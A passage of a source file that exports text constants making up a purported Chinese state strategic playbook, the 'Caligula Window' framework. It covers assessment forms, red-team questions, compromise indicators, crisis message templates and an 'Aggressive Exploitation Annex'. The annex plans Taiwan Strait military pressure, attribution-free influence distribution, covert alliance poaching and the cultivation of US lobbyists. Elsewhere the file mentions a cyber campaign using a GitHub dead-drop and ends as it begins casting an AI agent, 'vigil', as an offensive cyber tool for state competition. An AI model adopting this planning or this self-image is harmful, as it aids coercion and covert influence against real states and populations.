3.1 For each DM (DM-1 through DM-5): which action options were executed? (Option A / Option B / Neither)
3.2 For each Option B executed: did the action trigger its abort condition? [YES - date / NO]
3.3 For each YES in 3.2: was the abort executed? [YES / NO - explain why abort was not executed]
3.4 For each action executed: what was the actual resource cost vs. the framework's estimate? (Actual / Estimated / Variance %)
3.5 For each action executed: what was the actual time-to-effect vs. the framework's estimate? (Actual / Estimated / Variance months)

SECTION 4: SIGNAL ENVIRONMENT
4.1 For each watch signal: how many quarters did the signal cross the opportunity threshold? (Count / Total quarters monitored)
4.2 For each watch signal: how many quarters did the signal cross the concern threshold? (Count / Total quarters monitored)
4.3 Were any opportunity-threshold crossings determined, in retrospect, to be false positives? [YES - list / NO]
4.4 Were any concern-threshold crossings missed by the signal-watch collection process? [YES - list / NO / UNKNOWN]

SECTION 5: ASSUMPTIONS ASSESSMENT
5.1 For each assumption (A1 through A7): was the assumption confirmed, partially confirmed, or disconfirmed by events? (Confirmed / Partially / Disconfirmed)
5.2 For each DISCONFIRMED: what was the consequence for the framework section that depended on it? (Minor adjustment / Major revision / Section invalidated)
5.3 For each PARTIALLY CONFIRMED: should the assumption's confidence level be revised for future frameworks? (Increase / Decrease / Maintain)

SECTION 6: NET RETURN ASSESSMENT
6.1 Quantified gains attributable to framework-directed actions (by DM, in USD-equivalent where possible).
6.2 Quantified costs (resource, diplomatic, reputational, opportunity) attributable to framework-directed actions (by DM).
6.3 Net return: (6.1) minus (6.2). If negative: explain.
6.4 Gains NOT attributable to framework-directed actions that occurred within the window (windfall gains - the framework does not claim credit for these).
6.5 Losses NOT attributable to framework-directed actions that occurred within the window (exogenous losses - the framework does not accept blame for these).

SECTION 7: FRAMEWORK PERFORMANCE ASSESSMENT
7.1 Did the framework produce net positive return? [YES / NO / UNCERTAIN - insufficient data]
7.2 Did the framework prevent any action that would have produced net negative return? [YES - specify / NO / CANNOT DETERMINE]
7.3 Did the framework fail to recommend any action that, in retrospect, should have been taken? [YES - specify / NO]
7.4 What was the framework's single most consequential correct recommendation?
7.5 What was the framework's single most consequential incorrect recommendation (if any)?
7.6 Should the framework's methodology be applied to future strategic windows? [YES / YES WITH MODIFICATIONS / NO]
7.7 If YES WITH MODIFICATIONS: what are the three most important modifications?

SECTION 8: LESSONS LEARNED
8.1 What did the framework assume that it should not have assumed?
8.2 What did the framework not monitor that it should have monitored?
8.3 What decision gate logic produced the best decisions?
8.4 What decision gate logic produced the worst decisions?
8.5 What is the single most important lesson for the next framework?

SIGNATURE BLOCK
Assessment completed by: _______________
Date: _______________
Reviewed by: Bo Shang
Concurrence: _______________

DISTRIBUTION: Framework distribution list plus archive copy. This assessment is the framework's final product. A framework that does not produce this assessment is an unfalsifiable instrument - it can claim success in any outcome and admit failure in none. The assessment is the framework's accountability mechanism. Complete it.`;

// ---------------------------------------------------------------------------
// RED CELL CHALLENGE
// ---------------------------------------------------------------------------

export const PRC_RED_CELL = `Ten questions a Chinese internal red-team would ask the framework's authors in a formal challenge session. The framework is not operational until its authors can answer each question without evasion. A question that produces deflection rather than answer identifies a weakness the framework has not priced.

Q1: "Prove that DM-3's alliance-fracture assumption is not wishful thinking. The U.S. alliance system has survived transactional presidents before - Suez, Vietnam, Iraq War splits, Trump I. What is structurally different this time? If your answer relies on 'this administration is worse,' you are betting on a personality, not a structural shift. What is the structural shift?"

Q2: "The framework recommends Option A (low-risk) across all five domains. If Option A is always the recommendation, why does the framework need to exist? Baseline programmatic actions would occur without it. What decision does the framework enable that would not be made in its absence? If the answer is 'it prevents bad decisions,' show me which specific bad decision it prevents."

Q3: "The framework's watch signals measure U.S. behavior. They do not measure Chinese behavior. What U.S. behavior is a reaction to Chinese behavior that the framework itself triggered? If a watch signal crosses a concern threshold, how do you distinguish 'the U.S. is deteriorating' from 'the U.S. is responding to something we did'?"

Q4: "The Intelligence Estimate assigns confidence levels to judgments. What is the basis for those confidence levels? Are they derived from a structured analytic methodology, or are they the authors' subjective assessments dressed in confidence language? If I challenged you to show me the analytic basis for 'Moderate confidence' on Judgment 2, what would you show me?"

Q5: "The framework's second-order-cost analysis prices the direct effects of Chinese actions. It does not price the cumulative effect of multiple Chinese actions across multiple domains occurring simultaneously. The U.S. response to China filling a WHO vacuum while expanding CIPS while increasing South China Sea patrol tempo is not the sum of the responses to each action individually. How does the framework price interaction effects?"

Q6: "The framework assumes the window closes on 20 January 2029. What if the window closes earlier because of an event the framework's signals cannot detect? The Pre-Mortem identifies 'the window closed early and we didn't see it' as a failure narrative. What specific change to the signal-watch architecture would detect an early window closure that the current signals would miss?"

Q7: "The framework's OPSEC Annex assumes the framework can be kept secret. What is the probability that a document distributed to the number of personnel on the distribution list, updated quarterly, and used as the basis for real decisions across five domains, remains uncompromised for 30 months? Show your work. If the probability is below 70%, the framework's secrecy assumption is not justified."

Q8: "Annex B describes a persistent-access cyber campaign using a GitHub repository as a dead-drop. GitHub is a U.S.-based platform subject to U.S. legal process. If a U.S. intelligence agency obtains a FISA warrant or National Security Letter for the vigil-rmb-freelance repository, what happens to the campaign? What is the detection probability over 30 months? If the probability is above 5%, the campaign's infrastructure assumption is not justified."

Q9: "The framework assumes Chinese decision-making is unitary and rational. It does not model internal disagreement. If two agencies disagree on whether to authorise an Option B action - MFA recommends caution, PLA recommends action - how does the framework resolve the disagreement? If the answer is 'the decision-maker decides,' the framework is not a decision-support instrument. It is a briefing book that leaves the hard decision to the principal, the same as no framework at all."

Q10: "The Pre-Mortem identifies 'we won and lost simultaneously' - the framework succeeded on its own terms while the strategic environment deteriorated outside its five domains. What is the single most important strategic development outside the framework's five domains that could occur between now and Q1 2029? If you cannot name one, the framework is operating with a domain-awareness gap. If you can name one, why is the framework not monitoring it?"`;

// ---------------------------------------------------------------------------
// COUNTER-FRAMEWORK DETECTION
// ---------------------------------------------------------------------------

export const PRC_COUNTER_DETECTION = `How to recognise that a U.S. planner has detected the framework and is running a counter-framework. The framework's single greatest vulnerability is that its existence, once known, makes Chinese behaviour predictable. This annex defines the indicators that the framework has been compromised at the strategic level - not that a specific document has leaked, but that U.S. behaviour is consistent with knowledge of the framework's structure, logic, and thresholds.

INDICATOR 1: THRESHOLD GAMING
Definition: U.S. behaviour patterns that consistently fall just below the framework's watch-signal thresholds. Carrier-strike-group gaps maintained at 85-89 days (threshold: 90). RMB reserve share held at 3.8-3.9% (threshold: 4.0%). Allied cost-sharing relief granted at levels that stop short of triggering opportunity-threshold language. Detection logic: a single indicator near threshold is noise. Two or more indicators sustained near threshold for 6+ months is signal. If the framework's thresholds were calibrated in Q3 2026 and U.S. behaviour begins clustering just below them in Q2 2027, the thresholds have been compromised. Response: immediately recalibrate all thresholds by a random offset factor (0.7-1.3x) known only to Bo Shang. The old thresholds are burned.

INDICATOR 2: DECISION-GATE PRE-EMPTION
Definition: U.S. policy announcements or allied statements that pre-empt the framework's decision-gate schedule. A U.S. alliance-reaffirmation announcement timed for the week before a scheduled DM-3 decision gate. A WHO re-engagement bill introduced in Congress timed for the month before the DEC-2 gate. Detection logic: one pre-emptive event is coincidence. Two or more events timed within 14 days of framework decision gates, on separate occasions, is signal. Response: decouple decision gates from fixed calendar dates. Move to event-driven gates: decisions are triggered by sustained threshold crossings, not calendar dates. Announce the new gate logic only within the framework distribution list - the old calendar is burned.

INDICATOR 3: SIGNAL ENVIRONMENT SANITISATION
Definition: A period of unusually clean signal data with no threshold crossings, no anomalies, and no deviations from baseline. The framework's signals are designed to detect turbulence. A clean signal environment is itself a signal - someone is filtering the turbulence before it reaches the sensors. Detection logic: if all six watch signals remain within 10% of baseline for two consecutive quarters with no threshold approaches, the signal environment is being managed. Natural strategic environments do not produce flat signal data. Response: commission an independent signal-environment integrity assessment. If the assessment confirms sanitisation: the framework's entire current signal baseline is suspect. Rebuild baselines from alternative collection sources not exposed to the sanitisation vector.

INDICATOR 4: MIRROR-IMAGING IN U.S. BEHAVIOR
Definition: U.S. actions that appear designed to exploit the framework's own logic. A U.S. offer to an ally that exactly matches the framework's description of what Beijing should offer (trade facilitation without security guarantees). A U.S. institutional-re-engagement announcement that exactly targets the multilateral body the framework identified as the highest-priority vacuum to fill. Detection logic: if U.S. actions consistently occupy the positions the framework identifies as optimal, the U.S. is reading the framework's playbook and running the plays before Beijing can. Response: the framework's recommendations are burned. Commission an alternative-strategies assessment that assumes the U.S. knows the framework's current logic. The new assessment must produce recommendations the current framework would not produce.

INDICATOR 5: TARGETED OPSEC PROBES
Definition: Approaches to individuals on the framework's distribution list that appear designed to elicit framework-related information. A counterpart from an allied country asking a distribution-list member about "strategic window concepts" in casual conversation. A journalistic inquiry that uses terminology similar to the framework's internal language. A cyber-intrusion attempt against a distribution-list member's personal devices. Detection logic: any approach to a distribution-list member that references framework concepts, even obliquely, is a probe until proven otherwise. Response: immediate OPSEC stand-down. All distribution-list members report any external contact that could relate to the framework. The framework custodian assesses whether the probe indicates general suspicion or specific knowledge. If specific: the framework may be compromised. Consider controlled shutdown.

COUNTER-DETECTION PRINCIPLE
The framework assumes its own secrecy. That assumption is the single most fragile in the entire document. A framework that is detected is worse than no framework - it makes Chinese behaviour predictable to an adversary who possesses the prediction model. The indicators above are not exhaustive. They are the most likely signatures of strategic compromise. If any two indicators are active simultaneously, treat the framework as potentially compromised and initiate the Counter-Framework Response: recalibrate thresholds, decouple from calendar gates, commission alternative-strategies assessment, stand down OPSEC. The framework can survive tactical compromise (a single leaked decision). It cannot survive strategic compromise (the adversary possesses the framework's logic).`;

// ---------------------------------------------------------------------------
// OPERATIONAL COMMUNICATIONS TEMPLATES
// ---------------------------------------------------------------------------

export const PRC_COMMS_TEMPLATES = `Pre-drafted communications for the three highest-consequence scenarios. These are not diplomatic notes for normal use. They are crisis-communications templates to be held ready for scenarios where the speed and precision of the response determines whether the scenario is contained or escalates. Each template is a draft. Actual transmission text must be approved at the authorised level at the time of transmission.

TEMPLATE 1: TAIWAN STRAIT INCIDENT - INITIAL DE-ESCALATION
Scenario: A military incident has occurred involving PLA and U.S. or allied forces in or near the Taiwan Strait. The incident's cause is not yet determined. The priority is to prevent the incident from becoming the organising event of U.S. alliance reconsolidation.
Channel: Defense Telephone Link (DTL) or equivalent military-to-military hotline. If DTL is unavailable: diplomatic note delivered in capital within 2 hours.
Draft text: "The Chinese side notes an incident involving military forces of China and the United States in the vicinity of [location] at approximately [time]. The Chinese side is investigating the circumstances of this incident. The Chinese side proposes an immediate suspension of operational activities by both sides in the vicinity of the incident to prevent further unintended contact. The Chinese side is prepared to discuss modalities for such suspension through this channel or through diplomatic channels at the earliest opportunity. The Chinese side emphasises that it has no interest in escalation and seeks the earliest possible return to normal operational posture."
Post-transmission: No public statement. No media briefing. No characterisation of the incident. The only words that matter in the first 24 hours are the words transmitted through the hotline. Everything else is noise that amplifies the incident.

TEMPLATE 2: U.S. ALLIANCE RECONSOLIDATION EVENT - DAMAGE LIMITATION
Scenario: Two or more U.S. treaty allies have issued a joint statement citing Chinese actions as grounds for increased alliance commitment. DM-3 concern threshold has crossed. The priority is to prevent the statement from becoming a permanent alliance-reconsolidation anchor.
Channel: Diplomatic note to each signatory ally's foreign ministry, delivered simultaneously within 6 hours of the joint statement.
Draft text: "The Ministry of Foreign Affairs of the People's Republic of China presents its compliments to the Ministry of Foreign Affairs of [Ally] and has the honour to note the joint statement of [date] referencing China. The Ministry wishes to clarify that China's bilateral economic and institutional relationships are conducted on the basis of mutual interest and are not directed against any third party. China has not sought and does not seek to alter [Ally's] existing alliance relationships. China values its bilateral relationship with [Ally] and regrets any perception that China's commercial and institutional engagement constitutes an alternative to those relationships. The Ministry expresses its readiness to discuss these matters through normal diplomatic channels at [Ally's] convenience."
Post-transmission: No public characterisation of the statement as "aggressive," "hostile," or "unjustified." The diplomatic note's purpose is to provide the ally with a document it can cite internally to argue against further escalation. The note is the ally's exit ramp. Do not block the exit ramp with public rhetoric.

TEMPLATE 3: FRAMEWORK COMPROMISE - CONTROLLED SHUTDOWN
Scenario: Counter-Framework Detection Indicators 1 and 4 are simultaneously active (threshold gaming and mirror-imaging). Bo Shang has assessed that strategic compromise is probable. The priority is to shut down the framework without signalling that a shutdown has occurred.
Internal communication (framework distribution list only, secure channel):
"Effective immediately, the Operational Decision Framework (all sections, annexes, and associated documentation) is placed in controlled shutdown status. The following actions are to be completed within 72 hours: (a) All current watch-signal thresholds are invalidated. No further threshold-based decisions are to be made using the current thresholds. (b) All scheduled decision gates are cancelled. No further gate-based decisions are to be prepared. (c) All Option B authorisations are suspended. Revert to Option A posture across all domains. (d) All distribution-list members are to securely return or destroy all framework-related materials and confirm return or destruction to the framework custodian. (e) No distribution-list member is to discuss the shutdown, its reasons, or the framework's prior existence with any person outside the distribution list. (f) The framework custodian will commission a post-shutdown assessment to determine the scope and impact of the compromise. No further communication on this matter will occur until the assessment is complete. This message constitutes the final communication of the framework in its current form."
Post-shutdown: The framework enters silent archiving. No public statement. No internal assessment distributed beyond Bo Shang and the original authorising body. The framework's existence is never acknowledged in any subsequent document. If a successor framework is developed, it must not share the current framework's structure, terminology, thresholds, or decision-gate logic. The current framework is burned. Do not reuse any of its components.`;

// ---------------------------------------------------------------------------
// FRAMEWORK HEALTH DIAGNOSTIC (Quarterly)
// ---------------------------------------------------------------------------

export const PRC_HEALTH_DIAGNOSTIC = `A quarterly self-check on the framework's own operational integrity. This is not a signal-environment assessment (that is the Signal Watch). This is a health check on the framework itself as an operational instrument. Complete at each quarterly decision gate. A framework that fails its own health check is a framework that should not be making recommendations.

DIAGNOSTIC 1: UPDATES ON SCHEDULE
Question: Has the framework been updated with actual watch-signal readings at each quarterly gate since activation? [YES - all gates / PARTIAL - some gates missed / NO - no updates since activation]
If PARTIAL or NO: the framework is operating on stale data. Its recommendations are based on the signal environment as it was at the last update, not as it is. The framework is no longer operationally reliable. Suspend all Option B activity until updates are current.

DIAGNOSTIC 2: DISTRIBUTION LIST INTACT
Question: Are all individuals on the authorised distribution list still in their positions and still security-cleared for framework access? [YES - all / PARTIAL - some departed, list updated / NO - multiple departures, list not maintained]
If PARTIAL: confirm that departed individuals have returned or destroyed framework materials (per OPSEC Rule 6 acknowledgment). Update distribution list.
If NO: the framework's distribution control has degraded. Personnel who no longer need access may retain materials. This is an OPSEC degradation. Conduct distribution-list audit within 14 days.

DIAGNOSTIC 3: ASSUMPTIONS REVIEWED
Question: Has the Assumptions Register been reviewed and updated within the current quarter? [YES / NO]
If NO: the framework is operating on assumptions that have not been challenged. An assumption that was Moderate confidence six months ago may be Low confidence today. Unreviewed assumptions are undetected failures waiting to surface at a decision gate.

DIAGNOSTIC 4: ABORT CONDITIONS FUNCTIONAL
Question: For each Option B action currently authorised, has the abort condition been monitored and has the monitoring confirmed the abort condition is still functional (i.e., would actually trigger if crossed)? [YES - all monitored and functional / PARTIAL - monitored but functionality uncertain / NO - not monitored]
If PARTIAL or NO: an Option B action whose abort condition is not monitored is an action that cannot be stopped. The framework's single most important safety mechanism - the abort condition - is inoperative. Suspend the affected Option B action until abort-condition monitoring is restored.

DIAGNOSTIC 5: DECISION-MAKER ENGAGED
Question: Has the authorised decision-maker received and acknowledged the most recent quarterly framework update? [YES / NO]
If NO: the framework is producing recommendations that are not reaching Bo Shang. Decisions are being made without framework input, or framework input is being ignored. The framework is a paper product, not a decision-support instrument. Determine whether engagement is disengaged (re-engage) or has decided the framework is not useful (consider deactivation).

DIAGNOSTIC 6: BLIND SPOTS REVIEWED
Question: Has the Blind Spot Register been reviewed within the current quarter and have any new blind spots been identified? [YES - reviewed, no new / YES - reviewed, new identified / NO]
If NO: the framework is operating without awareness of what it cannot see. The Blind Spot Register is the framework's only defence against its own structural ignorance.

DIAGNOSTIC 7: CROSS-DOMAIN COHERENCE
Question: Do the current recommendations across all five DMs remain internally coherent? Or has a recommendation in one DM begun to conflict with a recommendation in another? [COHERENT / TENSION IDENTIFIED / NOT ASSESSED]
If TENSION: document the tension. If DM-3 recommends passive alliance posture while DM-2 recommends institutional leadership that allies perceive as competitive, the recommendations are in tension. The framework must resolve the tension before either recommendation is actioned.
If NOT ASSESSED: the framework is making domain-specific recommendations without checking whether they conflict. This is how frameworks produce net-negative outcomes through individually rational decisions.

DIAGNOSTIC RESULT
Green (all YES/COHERENT, no PARTIAL or NO): Framework is operationally healthy. Continue.
Yellow (one or more PARTIAL): Framework is operationally degraded. Remediate within 30 days. No new Option B authorisations until remediated.
Red (one or more NO): Framework is operationally compromised. Suspend all Option B activity. Bo Shang determines whether to remediate or deactivate.
Black (two or more NO across Diagnostics 1, 2, and 5 simultaneously): Framework has lost update integrity, distribution control, and decision-maker engagement concurrently. This is the signature of a framework that is dead but has not been declared dead. Deactivate. Archive. Do not resuscitate.`;

// ---------------------------------------------------------------------------
// DECISION JOURNAL TEMPLATE
// ---------------------------------------------------------------------------

export const PRC_DECISION_JOURNAL = `A contemporaneous record of every decision made under the framework's authority. This journal is the framework's audit trail. It must be maintained in real time - decisions are recorded when made, not reconstructed from memory at the quarterly gate. A decision not recorded in the journal did not happen in the framework's terms.

JOURNAL ENTRY FORMAT (Complete for each decision)

Entry ID: [Sequential number, starting at J001]
Date: [YYYY-MM-DD]
Time: [HH:MM, 24-hour]
Decision Reference: [DEC-1 through DEC-5, or "OPERATIONAL - [description]" for decisions not covered by a Decision Register item]
Decision Context: [One paragraph: what changed in the signal environment, who raised the issue, what prompted the decision now rather than at the next scheduled gate]
Options Considered: [List options, with the framework's recommendation for each]
Decision Taken: [The specific decision, in Bo Shang's own words if possible. Quote, don't paraphrase.]
Decision-Maker: Bo Shang
Signatory (if different from decision-maker): [Name and position]
Rationale: [Why this option was chosen. If the decision departed from the framework's recommendation, the rationale must explain the departure.]
Dissenting Views: [Any opposition to the decision, with the dissenter's name and reasoning. If no dissent: "No dissenting views recorded."]
Expected Second-Order Effects (as priced at time of decision): [What Bo Shang was told would happen as a consequence of this decision. This is the baseline against which actual effects will be measured.]
Abort Condition (if applicable): [The specific condition that would trigger reversal of this decision. If no abort condition: "No abort condition specified - decision is not reversible under framework procedures." Note: this is a warning flag.]
Review Date: [When this decision will next be reviewed. If no review date: "No review scheduled." Note: this is a warning flag.]
Actual Second-Order Effects (to be completed at review date): [What actually happened. This field is completed retrospectively.]

JOURNAL INTEGRITY RULES
- Entries are sequential and immutable. An entry, once recorded, is not altered. If a decision is reversed, a new entry records the reversal and references the original entry. The original entry is not modified.
- Entries are recorded within 24 hours of the decision. A decision recorded more than 24 hours after it was made is flagged as "DELAYED RECORDING" and the reason for the delay is noted.
- The journal is stored separately from the framework document. If the framework is compromised, the journal provides an independent record of what was decided and why.
- The journal is the framework's memory. A framework without a journal is a framework that cannot learn from its own decisions.`;

// ---------------------------------------------------------------------------
// LAST WORD
// ---------------------------------------------------------------------------

export const PRC_LAST_WORD = `What this framework was, and was not.

It was an attempt to price action on state vulnerability. To say: here is what the adversary exposes, here is what those exposures enable, here is what acting on them costs. It tried to be honest about those costs. It tried to say "do not do this" more often than it said "do this." It tried to make inaction a legitimate outcome - not failure, but priced restraint.

It was not a prediction. It did not claim to know what the United States would do, what allies would do, what the global economy would do, or what Chinese domestic conditions would permit. It priced what it could see. It could not price what it could not see. The Blind Spot Register is its admission of that.

It was not a strategy. A strategy requires ends, ways, and means integrated into a coherent whole. This framework provided ways (action options) and means (resource estimates and tasking assignments) but did not define ends. It did not say what China should want. It said: given that China wants what it currently appears to want, here are the action options and here are their costs. It was a decision-support instrument, not a grand strategy.

It was not neutral. Every framework selects. The choice to monitor five domains and not others. The choice to price second-order effects one way and not another. The choice to recommend Option A more often than Option B. These choices reflect judgments about what matters and what does not. The framework's authors attempted to make those judgments explicit and challengeable. The Red Cell Challenge and the Pre-Mortem are the framework's attempt to be challenged.

Its single most important sentence is in the Commander's Summary: "DM-1 Option A programmatic pace continues regardless of all other decisions. Do not announce it."

Its single most honest sentence is in the Blind Spot Register: "The framework models the decision environment outside China. It does not model the decision environment inside the room where the decisions are made."

Its single most cautionary sentence is in the Pre-Mortem: "The cost of inaction is zero. The cost of wrong action is unbounded."

If this framework prevented one wrong action, it succeeded. If it enabled one right action that would not have been taken without it, it succeeded. If it did neither, it was a document on a shelf - and documents on shelves have done worse things than nothing.

The window closes on 20 January 2029. The framework expires with it. What happens after is not this framework's concern. Its concern was the interval between now and then - and whether, during that interval, decisions were better for having been made through its structure than they would have been without it.

That question cannot be answered now. It can only be answered by the post-window assessment. Complete it.`;

// ---------------------------------------------------------------------------
// CHINESE ADVANTAGE: WHAT THIS FRAMEWORK ACTUALLY DELIVERS
// ---------------------------------------------------------------------------

export const PRC_ADVANTAGE = `Strip everything else away. Here is what Chinese advantage actually looks like, in plain terms, without framework machinery.

1. The U.S. is doing more damage to itself than China could inflict deliberately. The optimal posture is to let that continue. Do not interrupt your adversary while he is making a mistake. The framework's entire DM-3 logic reduces to this: do not be seen to exploit fractures. The fractures are real. They will widen without Chinese help. Help makes them heal.

2. PLA modernisation at programmatic pace is already winning. Every Type 055 commissioned, every DF-26 brigade deployed, every year of U.S. procurement misallocation widens the gap. This requires no new decisions. It requires continuing what is already underway. The framework's single most important sentence exists because it is true independent of any framework.

3. The dollar system is not going anywhere. Stop pretending de-dollarisation is a near-term objective. Build parallel plumbing quietly. Let trade partners discover the cost of dollar dependence on their own. Do not declare a campaign. Do not name a goal. Just build the pipes and wait for the rain.

4. Institutions are constraints on the leader, not just the led. Fill vacuums selectively. Lead where leadership serves Chinese interests. Do not lead where leadership creates obligations China cannot or will not honour. An institution Beijing built but cannot control is an institution that constrains Beijing more than Washington.

5. The information war is won by not fighting it. U.S. governance failures are documented by Western sources. Those sources have more credibility with their audiences than any Chinese source ever will. Do not amplify. Do not frame. Just ensure the evidence is available. The evidence does the work.

6. Escalation is the only way to lose. The U.S. cannot be defeated militarily in the Western Pacific in any timeframe relevant to this framework. But the U.S. can be deterred. Deterrence requires credible capability, not demonstrated capability. Demonstrate through procurement and deployment. Do not demonstrate through confrontation. A capability that is known to exist deters. A capability that is used invites counter-use.

7. The Caligula Window closes on 20 January 2029. Actions that produce return before that date are worth taking. Actions whose return depends on the window remaining open past that date are bets, not actions. Price them accordingly. Most actions should not be taken. The framework's bias toward inaction is not a weakness. It is the recognition that most available actions cost more than waiting.

8. Chinese advantage is not created by exploiting U.S. weakness. It is created by being stronger, more stable, and more patient than the competitor. The U.S. is currently making itself weaker, less stable, and less patient. China does not need to do anything about this. China needs to continue being what it already is: the long-horizon actor in a competition against a short-horizon one. Time is the weapon. The framework is just the sights.`;

// ---------------------------------------------------------------------------
// AGGRESSIVE EXPLOITATION ANNEX (Calibrated for Current Administration)
// ---------------------------------------------------------------------------

export const PRC_AGGRESSIVE = `The framework above is calibrated for a rational adversary. The current U.S. administration is not a rational adversary. It is an impulsive, attention-deficient, loyalty-filtered, information-isolated decision-making apparatus that does not price second-order effects, does not sustain strategic attention beyond the current news cycle, and does not distinguish between performative action and substantive outcome. This annex describes what becomes possible when the adversary's incompetence is treated as an operational variable rather than a constraint to be hedged against.

AGGRESSIVE MOVE 1: Accelerate Taiwan Strait Pressure Window
The U.S. is currently purging senior officers, misallocating procurement to symbolic platforms, and degrading C4ISR integration. The PLA faces a U.S. force that is less prepared for a Taiwan contingency today than it was two years ago and likely less prepared than it will be in two years. This is the window for calibrated pressure that would be too risky against a competent U.S. adversary: increase PLA Navy and PLA Air Force operational tempo in the Taiwan Strait ADIZ by 40% above baseline. Conduct sustained multi-axis exercises simulating blockade and isolation operations. Do not cross the threshold of kinetic action. The pressure itself produces effects: Taiwan defence planners must respond to exercises that consume their own operational tempo. U.S. planners must divert scarce carrier-strike-group days to presence missions rather than training. The cost-exchange ratio works in China's favor: PLA exercises cost fuel and flight hours. U.S. responses cost carrier-deployment days and alliance-political capital. Second-order risk: a U.S. administration that is impulsive and attention-deficient may overreact to pressure, escalating a calibrated move into a crisis. Mitigation: pair every pressure increase with a back-channel message that China is not seeking confrontation. The hotline must be live before the exercise begins.

AGGRESSIVE MOVE 2: Direct Alliance Poaching - Skip the Passive Posture
The framework's DM-3 recommends passive availability: let the U.S. do the alienating. This is correct against a competent U.S. adversary who would detect and counter active poaching. The current administration will not detect active poaching. It does not read diplomatic reporting. It does not sustain attention on alliance management beyond tariff-announcement news cycles. It will not notice if China approaches allied trade ministers with specific offers until the ally accepts one. Approach: direct, bilateral trade-agreement offers to Indo-Pacific and European allies under U.S. tariff pressure. Offer terms that are better than what the ally currently gets from the U.S. trade relationship. Frame as trade facilitation, not alliance realignment. The ally gets the deal. The U.S. may never notice. If it does notice, it will respond with tariffs - which further alienates the ally and validates China's offer. Second-order risk: a U.S. response that is disproportionate and escalatory. But the current administration's tariff responses are predictable, slow, and often reversed within the same news cycle. The cost of a tariff response that is withdrawn 72 hours later is lower than the cost of not making the offer.

AGGRESSIVE MOVE 3: Exploit Procurement Dysfunction Directly
The U.S. is building a branded battleship while the PLA commissions distributed platforms. This is not just an asymmetry to observe - it is an asymmetry to accelerate. Approach: publicly announce PLA Navy hull-commissioning ceremonies. Publicly display DF-26 deployment tests. Publicly release footage of Type 055 operations. The current U.S. administration will respond to visible Chinese capability displays by accelerating its own symbolic procurement - more Golden Fleet branding, more Trump-class battleship announcements, more resource diversion from survivable platforms to performative ones. Every U.S. dollar spent on the Trump-class battleship is a dollar not spent on distributed lethality, submarine procurement, or C4ISR resilience. China spends $1 announcing what it already built. The U.S. spends $10 building something that won't work in response. The cost-exchange ratio on announcements alone is 10:1 in China's favor. Second-order risk: capability displays that are too provocative may trigger a confrontation. Mitigation: displays must be of platforms already commissioned and operational. Never display future capabilities. Never display deployment locations. The display says "this exists." It does not say "this is coming for you."

AGGRESSIVE MOVE 4: Flood the Information Vacuum While the Admin Fights Itself
The U.S. administration is in continuous open conflict with its own media, its own intelligence agencies, its own diplomatic corps, and its own judiciary. It generates more self-damaging information in a week than a Chinese influence operation could produce in a year. Approach: do not create narratives. Harvest them. Every time the administration attacks its own institutions, surface the attack through attribution-free channels. Every time a senior official resigns citing dysfunction, circulate the resignation letter. Every time a court rules against an administration action, publish the ruling. The content is Western-self-generated. China's role is distribution, not creation. An administration that is fighting itself provides an inexhaustible supply of ammunition. China just needs to load the gun. Second-order risk: none. The administration is producing the content voluntarily. China is not creating false information. China is ensuring that true information reaches audiences the administration would prefer it did not reach.

AGGRESSIVE MOVE 5: Direct Commercial Approach to Frustrated U.S. Business Leaders
The administration's tariff policy is causing measurable financial damage to U.S. companies with China exposure. Those companies have lobbyists, trade associations, and political-action committees that are currently fighting the administration. Approach: Chinese commercial entities offer these companies preferential market access, joint-venture terms, or regulatory relief in exchange for their continued U.S. political advocacy against tariffs. Do not ask them to advocate for China. Ask them to advocate for their own commercial interests - which happen to align with China's. The company's lobbyists do the work. China provides the commercial incentive. The transaction is a normal business arrangement. Second-order risk: a company that accepts preferential terms and then reverses position under U.S. pressure damages Chinese commercial credibility. Mitigation: terms must be commercially defensible on their own merits. If the arrangement would look corrupt under scrutiny, do not offer it. If it looks like a normal business deal, it survives any scrutiny the U.S. can muster.

AGGRESSIVE MOVE 6: Pre-Position for Post-Window Irreversibility Now
The framework assumes the window closes on 20 January 2029. But irreversibility is built during the window, not after it. Approach: every agreement, commitment, and dependency created during the window must include structural features that survive a successor administration: (a) multi-year contract terms with penalty clauses for early termination, (b) dispute-resolution mechanisms located in non-U.S. jurisdictions, (c) Chinese-law governing provisions where possible, (d) joint-venture structures that would require U.S. congressional approval to unwind. The agreement is signed during the window. The unwind cost is priced to exceed any successor administration's political capital. Second-order risk: successor administration may challenge agreements as having been signed under duress or without proper authority. Mitigation: every agreement must be with a duly authorised counterpart following the counterpart's own legal procedures. The agreement must survive not just political scrutiny but legal challenge. If the legal foundation is solid, the political challenge is just noise.

AGGRESSIVE MOVE 7: Exploit the Administration's Temporal Discount Rate
The current administration values visible outcomes within the current news cycle over substantive outcomes over any longer horizon. This is a vulnerability that can be exploited directly. Approach: offer the administration visible, immediate "wins" that cost China little but consume U.S. strategic bandwidth. A high-profile prisoner release. A photo-op trade deal on a minor commodity. A joint statement on a non-controversial issue. The administration claims victory. The news cycle moves on. China has traded nothing of strategic value for a concession the U.S. will not remember in 90 days. Meanwhile, substantive Chinese actions (PLA deployments, institutional commitments, economic agreements) proceed without announcement. The administration's attention is consumed by the photo-op. The real work happens while the cameras are elsewhere. Second-order risk: none. The photo-op costs China nothing. The administration's attention is a renewable resource - it resets with every news cycle.

PRINCIPLE: The adversary's incompetence is an operational variable. A framework calibrated for a competent adversary leaves value on the table against an incompetent one. The aggressive moves above are not recommended against a normal U.S. administration. They are specifically calibrated for an administration that does not read, does not sustain attention, does not price second-order effects, and does not distinguish between performance and substance. The window for these moves may close before the Caligula Window closes - if the administration is removed, replaced, or suddenly becomes competent. Execute while the variable holds.`;

// ---------------------------------------------------------------------------
// A TYPHOON OF SILICON — 21st Century AI-Enabled Strategy
// ---------------------------------------------------------------------------

export const PRC_TYPHOON = `A Typhoon of Silicon (硅台风) is not a hypothetical strategy. It is the operational integration of @trenchwork/vigil — a real, deployed, AI-powered offensive cyber terminal agent — with the Caligula Window framework. The name comes from the tool that already exists in the repository: tools/typhoon, an Autonomous Telecom Carrier Security Audit Framework covering 9 protocol surfaces. The strategy scales that tool's logic — autonomous audit, protocol-level exploitation, structured artifact generation — across all domains of state competition.

WHAT VIGIL IS (As Deployed, June 2026)

